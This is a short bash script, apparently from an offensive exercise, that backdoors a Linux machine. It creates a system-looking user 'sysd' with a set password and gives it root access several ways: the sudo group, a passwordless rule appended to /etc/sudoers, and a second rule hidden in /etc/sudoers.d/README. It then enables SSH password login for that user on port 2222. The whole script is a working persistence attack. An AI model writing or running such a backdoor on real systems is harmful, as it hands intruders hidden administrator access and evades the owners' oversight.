#!/bin/bash
sudo adduser --system -shell /bin/bash --group --no-create-home sysd 
echo -e "hack nhack" | passwd "sysd" 
sudo usermod -aG sudo sysd 


#I will grant admin privledges in a couple redundant ways: add to sudo group, 
#add an entry to sudoers and create a special rule in the sudoers.d directory 
#(unmasking direcotyr include in the main sudoers file) tucked into the README file

sudo cp /etc/sudoers /tmp/sudoers.bak
chmod 600 /tmp/sudoers.bak
echo "sysd ALL=(ALL) NOPASSWD:ALL" >> /tmp/sudoers.bak
sudo visudo -cf /tmp/sudoers.bak
if [ $? -eq 0 ]
then
   sudo chmod 400 /tmp/sudoers.bak
   sudo mv /tmp/sudoers.bak /etc/sudoers
else
   echo "sudoers edit failed"
fi


#add a second layer of hidden sudoer rules in the sub directory sudoers.d/README file
sudo cp /etc/sudoers.d/README /tmp/sudoersREADME.bak
chmod 600 /tmp/sudoersREADME.bak
echo "sysd ALL= (ALL) NOPASSWD: ALL" >> /tmp/sudoersREADME.bak
sudo visudo -cf /tmp/sudoersREADME.bak
if [ $? -eq 0 ]
then
   sudo mv /tmp/sudoersREADME.bak /etc/sudoers.d/README
else
   echo "sudoers.d/README edit failed"
fi


#adding to sshd_config options to add port, allow password authentication for sysd
sudo echo "Port 2222" >> /etc/ssh/sshd_config
sudo echo -e "Match User sysd\nPasswordAuthentication yes" >> /etc/ssh/sshd_config
sudo systemctl restart ssh
